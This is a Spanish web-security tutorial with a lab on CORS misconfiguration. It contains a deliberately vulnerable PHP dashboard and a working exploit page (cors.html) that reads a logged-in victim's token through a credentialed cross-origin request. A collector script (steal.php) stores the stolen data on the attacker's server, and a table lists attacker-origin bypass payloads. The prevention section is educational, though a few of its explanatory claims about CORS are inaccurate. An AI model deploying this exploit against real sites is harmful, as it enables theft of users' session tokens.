---
icon: square-code
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# CORS (Cross-Origin Resource Sharing)

## Practica de explotación `CORS`

Imaginemos que tenemos esta pagina de aqui:

> dashboard.php

```php
<?php
session_start();
header('b0x-Powered-By: White beard Pirates 8-)');

// Verificar si el usuario está logueado
if (!isset($_SESSION['logged2']) || $_SESSION['logged2'] !== true) {
    header('Location: login.php', true, 302);
    exit;
}

// Configurar encabezados CORS
if (isset($_SERVER['HTTP_ORIGIN'])) {
    // Permitir el origen dinámicamente, dependiendo de la solicitud
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');

    // Especificar los encabezados que serán expuestos para CORS
    header('Access-Control-Expose-Headers: TOKEN, Access-Control-Allow-Origin, User-Name, Client-IP');
}

// Mostrar el token en la página
$api_token = $_SESSION['api_token'];

// Capturar el nombre de usuario de la sesión (ya que está logueado)
$username = $_SESSION['username'] ?? 'No username provided';  // Extraer el nombre de usuario desde la sesión
$client_ip = $_SERVER['REMOTE_ADDR'];  // La IP sigue siendo la de la solicitud (no cambia)


// Enviar el token, nombre de usuario y la IP en los encabezados de respuesta, solo si es una solicitud GET
if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_SERVER['HTTP_TOKEN'])) {
    // Añadir el token, nombre de usuario y la IP a los encabezados de la respuesta
    header('TOKEN: ' . $api_token);
    header('User-Name: ' . $username);
    header('Client-IP: ' . $client_ip);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
</head>
<body>
    <div align="center" style="margin: 30px;">
        Bienvenido. Obtenga la respuesta HTTP de esta página web mediante una solicitud CORS. ¡Listo! Lección aprendida: nunca confíe en un "Origin:" arbitrario.
    </div>

    <p>Your API Token: <?= htmlspecialchars($api_token) ?></p>
    <p>Your Username: <?= htmlspecialchars($username) ?></p>
    <p>Your IP Address: <?= htmlspecialchars($client_ip) ?></p>

    <p>This token is also sent in the request headers as <strong>TOKEN</strong>.</p>

    <!-- Formulario para actualizar el perfil -->
    <form action="dashboard.php" method="POST">
        <label for="username">Nuevo usuario:</label>
        <input type="text" name="username" id="username" required><br>

        <label for="password">Nueva contraseña:</label>
        <input type="password" name="password" id="password" required><br>

        <!-- Campo oculto para enviar el API token en el POST -->
        <input type="hidden" name="api_token" value="<?= htmlspecialchars($api_token) ?>">

        <input type="submit" value="Actualizar perfil">
    </form>

    <script>
        // Enviar el token, nombre de usuario y IP como parte del encabezado de la solicitud GET
        fetch(window.location.href, {
            method: 'GET',
            headers: {
                'TOKEN': '<?= htmlspecialchars($api_token) ?>', // Enviar el token en el encabezado
                'User-Name': '<?= htmlspecialchars($username) ?>', // Enviar el nombre de usuario
                'Client-IP': '<?= htmlspecialchars($client_ip) ?>' // Enviar la IP del cliente
            }
        })
        .then(response => response.text())
        .then(data => {
            console.log('Request successful:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    </script>

</body>
</html>
```

Veremos que esta parte de aqui es la vulnerable a `CORS`:

```php
// Configurar encabezados CORS
if (isset($_SERVER['HTTP_ORIGIN'])) {
    // Permitir el origen dinámicamente, dependiendo de la solicitud
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');

    // Especificar los encabezados que serán expuestos para CORS
    header('Access-Control-Expose-Headers: TOKEN, Access-Control-Allow-Origin, User-Name, Client-IP');
}
```

Si entramos dentro de la pagina, veremos un login, las credenciales por defecto seran las siguiente:

```
User: user/admin
Pass: user/admin
```

Una vez que estemos dentro veremos algo asi:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que estamos viendo nos muestra la informacion del usuario, junto con su `TOKEN`, etc... Vamos a capturar la peticion con `BuprSuite` recargando la pagina y dentro de la misma añadiremos en la cabecera despues del parametro `Connect` lo siguiente:

```
Origin: http://evil.es
```

Nos quedara algo asi:

```
GET /dashboard.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/
Connection: keep-alive
Origin: http://evil.es
Cookie: PHPSESSID=ist11l3vcbit5rqtqdnm68gqk8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Antes de enviarlo activaremos en `BurpSuite` el que obtengamos las respuestas del servidor:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez activado vamos a enviarlo y veremos en la respuesta lo siguiente:

```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 17:11:39 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
d1se0-Powered-By: White beard Pirates 8-)
Access-Control-Allow-Origin: http://evil.es
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: TOKEN, Access-Control-Allow-Origin, User-Name, Client-IP
TOKEN: admin_token
User-Name: admin
Client-IP: 172.17.0.1
Vary: Accept-Encoding
Content-Length: 1853
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<HTML_PAGE>
```

Vemos que nos esta habilitando la conexion de forma insegura con nuestro servidor de la maquina atacante, por lo que vamos a crear un `exploit` y subirlo a nuestro `apache2` del atacante, para habilitar una pagina maliciosa.

```
Access-Control-Allow-Origin: http://evil.es
Access-Control-Allow-Credentials: true
```

> cors.html

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Explotation</title>
    <script>
        // Función para enviar la solicitud GET manualmente
        function obtenerDatos() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4) {
                    if (this.status == 200) {
                        // Captura todos los encabezados de la respuesta
                        var headers = this.getAllResponseHeaders();
                        console.log("Response Headers: ");
                        console.log(headers); // Muestra todos los encabezados

                        // Asegúrate de que estás extrayendo correctamente el token, el nombre de usuario y la IP
                        var tokenMatch = headers.match(/token:\s*(\S+)/i);
                        var userNameMatch = headers.match(/user-name:\s*(\S+)/i);
                        var clientIpMatch = headers.match(/client-ip:\s*(\S+)/i);

                        // Mostrar el token, el nombre de usuario y la IP en la consola
                        if (tokenMatch && userNameMatch && clientIpMatch) {
                            console.log("TOKEN: " + tokenMatch[1]);
                            console.log("User Name: " + userNameMatch[1]);
                            console.log("Client IP: " + clientIpMatch[1]);

                            // Aquí vamos a hacer la solicitud POST para enviar estos datos al servidor
                            var data = {
                                token: tokenMatch[1],
                                username: userNameMatch[1],
                                ip: clientIpMatch[1]
                            };

                            // Enviar los datos al servidor para almacenarlos en un archivo .txt
                            var postRequest = new XMLHttpRequest();
                            postRequest.open("POST", "steal.php", true);
                            postRequest.setRequestHeader("Content-Type", "application/json");
                            postRequest.onreadystatechange = function() {
                                if (postRequest.readyState == 4 && postRequest.status == 200) {
                                    console.log("Datos guardados correctamente en el servidor.");
                                }
                            };
                            postRequest.send(JSON.stringify(data));  // Enviar los datos como JSON
                        } else {
                            console.log("No token, user-name, or client-ip found in the response.");
                        }
                    } else {
                        console.error("Failed to fetch API token. Status: " + this.status);
                    }
                }
            };

            // Realizar la solicitud GET a dashboard.php
            xhttp.open("GET", "http://<IP_VICTIM>/dashboard.php", true);  // Cambia la IP por la correcta si es necesario
            xhttp.withCredentials = true;  // Esto enviará la cookie PHPSESSID si es necesario
            xhttp.send();
        }

        // Función de validación
        function validar() {
            // La palabra estática a comparar
            const palabraCorrecta = "secreta";

            // Obtener el valor del campo de texto
            const palabraIngresada = document.getElementById("palabra").value;

            // Comparar la palabra ingresada con la palabra correcta
            if (palabraIngresada === palabraCorrecta) {
	            alert("¡Correcto!");
            } else {
                alert("Incorrecto, intenta nuevamente.");
            }
        }

        // Función para ejecutar el script clear.sh
        function ejecutarClear() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    alert("Texto limpiado correctamente.");
                    console.log(this.responseText);  // Muestra el resultado del script en la consola
                }
            };
            // Enviar una solicitud GET a clear.php para ejecutar el script
            xhttp.open("GET", "clear.php?action=clear", true);
            xhttp.send();
        }
    </script>
</head>
<body>
    <div align="center" style="margin: 30px;">
        Explotacion de CORS! By d1se0.
    </div>

    <p>Your API Token: <span id="api-token">No token</span></p>

    <!-- Botón para enviar la solicitud GET manualmente -->
    <button onclick="obtenerDatos()">Obtener Datos</button>
    <!-- Formulario para validar la palabra -->
    <h3>Verifica tu palabra</h3>
    <label for="palabra">Introduce la palabra:</label>
    <input type="text" id="palabra" placeholder="Escribe aquí">
    <button onclick="validar()">Validar</button>

	<!-- Botón para ejecutar el script clear.sh -->
    <button onclick="ejecutarClear()">Limpiar stolen_tokens.txt</button>
</body>
</html>
```

(Cambiamos la parte de `<IP_VICTIM>` por la `IP` de la maquina victima donde esta la vulnerabilidad)

Tambien tendremos que crear lo que va a procesar la solicitud y volcarlo en un `.txt` para que lo podamos ver:

> steal.php

```php
<?php
// Obtener los datos JSON del cuerpo de la solicitud
$data = json_decode(file_get_contents("php://input"), true);

// Verificar si el token, nombre de usuario y IP están presentes
if (isset($data['token'], $data['username'], $data['ip'])) {
    // Abrir el archivo para escribir los datos
    $file = fopen('stolen_tokens.txt', 'a');  // 'a' abre el archivo para agregar datos
    if ($file) {
        // Escribir los datos en el archivo
        fwrite($file, "Token: " . $data['token'] . "\n");
        fwrite($file, "Username: " . $data['username'] . "\n");
        fwrite($file, "IP Address: " . $data['ip'] . "\n");
        fwrite($file, "----------------------\n");
        fclose($file);
        echo "Datos guardados correctamente.";
    } else {
        echo "Error al abrir el archivo para escribir los datos.";
    }
} else {
    echo "Faltan datos: token, username o ip.";
}
?>
```

Tambien crearemos un archivo llamado `stolen_tokens.txt` que este en el mismo directorio.

> OPCIONAL

Si queremos borrar el contenido del archivo `stolen_tokens.txt` para realizar de forma sucesiva el ataque, podremos crear lo siguiente:

> clear.php

```php
<?php
// clear.php
if (isset($_GET['action']) && $_GET['action'] == 'clear') {
    // Ruta al script bash (asegúrate de que la ruta es correcta y el script tenga permisos de ejecución)
    $output = shell_exec('/var/www/html/clear.sh');

    // Si el script devuelve algún resultado, lo mostramos
    if ($output) {
        echo "<pre>$output</pre>";
    } else {
        echo "El script se ejecutó correctamente pero no devolvió salida.";
    }
}
?>
```

Y en el mismo directorio tendra que ir el siguiente archivo:

> clear.sh

```bash
#!/bin/bash 

echo "" > stolen_tokens.txt 
echo "Texto limpiado!"
```

Todo este contenido del `exploit` tiene que estar en nuestro `/var/www/html` e iniciaremos el servicio de `apache2`:

```shell
service apache2 start
```

Ahora tendremos que acceder a nuestro `cors.html` desde la web:

```
URL = http://<IP_ATTACKER>/cors.html
```

Ahora estando a la escucha con `BurpSuite` tendremos que darle al boton `Obtener Datos`. `BurpSuite` capturara la peticion y cambiaremos la parte de `Cookie: PHPSESSID=<COOKIE_VICTIM>` quedando algo asi:

```
GET /dashboard.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://192.168.60.131
Connection: keep-alive
Referer: http://192.168.60.131/
Cookie: PHPSESSID=ist11l3vcbit5rqtqdnm68gqk8
Priority: u=0

```

Y si le damos al boton directamente de `Intercep on` veremos en la consola que salio todo perfecto:

<figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

Y si vamos al archivo donde se guarda todo, veremos que funciono:

```
Token: admin_token
Username: admin
IP Address: 172.17.0.1
----------------------
```

Ahora si probamos a meter donde la pagina de `cors.html` en `TOKEN` del usuario `admin` en este campo:

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

Veremos que es el correcto, por lo que habremos aprovechado de forma corercta la obtencion de informacion como el `TOKEN` del usuario, aprovechando la vulnerabilidad `CORS` y haciendo que el servidor confie en el `origen` de nuestro servidor.

## Explicación detallada de `CORS`

### Vulnerabilidad CORS en Hacking Web

### ¿Qué es CORS?

`CORS (Cross-Origin Resource Sharing)` es un mecanismo de seguridad implementado en los navegadores web que restringe las solicitudes HTTP de origen cruzado. Esto significa que una página web en un dominio (ejemplo.com) no puede hacer solicitudes AJAX a otro dominio diferente (api.otrodominio.com), a menos que el servidor de destino lo permita explícitamente mediante cabeceras HTTP.

El objetivo principal de CORS es prevenir ataques como el [Cross-Site Request Forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) (CSRF) y otros ataques de origen cruzado.

### ¿Cómo funciona CORS?

Cuando una aplicación web hace una petición a un dominio diferente, el navegador agrega la cabecera `Origin` en la solicitud. El servidor debe responder con la cabecera `Access-Control-Allow-Origin` para indicar si permite o no la petición desde ese origen.

Ejemplo de una solicitud CORS:

```http
GET /datos HTTP/1.1
Host: api.otrodominio.com
Origin: https://ejemplo.com
```

Si el servidor permite la petición, responderá con:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://ejemplo.com
```

Si no está permitido, el navegador bloqueará la respuesta.

### ¿Cómo se explota CORS en hacking web?

Una mala configuración de CORS puede permitir a un atacante robar datos sensibles de un usuario autenticado en una aplicación web. Algunas configuraciones peligrosas incluyen:

### Permitir cualquier origen (`*`)

Si el servidor responde con:

```http
Access-Control-Allow-Origin: *
```

Entonces cualquier sitio puede hacer solicitudes al servidor y acceder a la respuesta.

### Reflejar el valor del `Origin`

Algunos servidores devuelven el valor de la cabecera `Origin` en `Access-Control-Allow-Origin` sin validación:

```http
Access-Control-Allow-Origin: https://malicioso.com
```

Esto permite a un atacante alojar un sitio malicioso y robar datos de los usuarios autenticados en el dominio víctima.

### Permitir credenciales con configuraciones inseguras

Si el servidor permite credenciales (`cookies, tokens, etc.`) con `Access-Control-Allow-Credentials: true` y combina esto con `Access-Control-Allow-Origin: *`, entonces un atacante puede robar sesiones de usuarios.

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Esta combinación es extremadamente peligrosa.

### Payloads y Bypasses para Explotación de CORS

| Escenario                                              | Payload/Bypass                                                                                                            |
| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| Prueba básica de CORS                                  | `fetch('https://victima.com/endpoint', {credentials: 'include'}).then(res => res.text()).then(data => console.log(data))` |
| Comprobar si el servidor refleja `Origin`              | `Origin: https://attacker.com`                                                                                            |
| Bypass cuando `Access-Control-Allow-Origin` usa `null` | `sandboxed iframe` o `data://` scheme                                                                                     |
| Usar subdominios para explotar regex débil             | `https://sub.attacker.com` si el servidor permite `*.attacker.com`                                                        |
| Engañar validaciones débiles de dominio                | `https://trusted.com.attacker.com` si el servidor usa `endsWith()` en validación                                          |

### ¿Cómo prevenir ataques CORS?

* No usar `Access-Control-Allow-Origin: *` en servicios con información sensible.
* No reflejar el valor de `Origin` sin validarlo correctamente.
* Evitar `Access-Control-Allow-Credentials: true` a menos que sea estrictamente necesario.
* Usar una lista blanca de orígenes permitidos en el servidor.

### Conclusión

La vulnerabilidad CORS ocurre cuando la configuración del servidor permite orígenes no confiables acceder a datos sensibles. Es una de las fallas más comunes en aplicaciones web y puede tener consecuencias graves si se combina con el robo de credenciales o datos de usuarios autenticados. Configurar CORS correctamente es fundamental para la seguridad web.
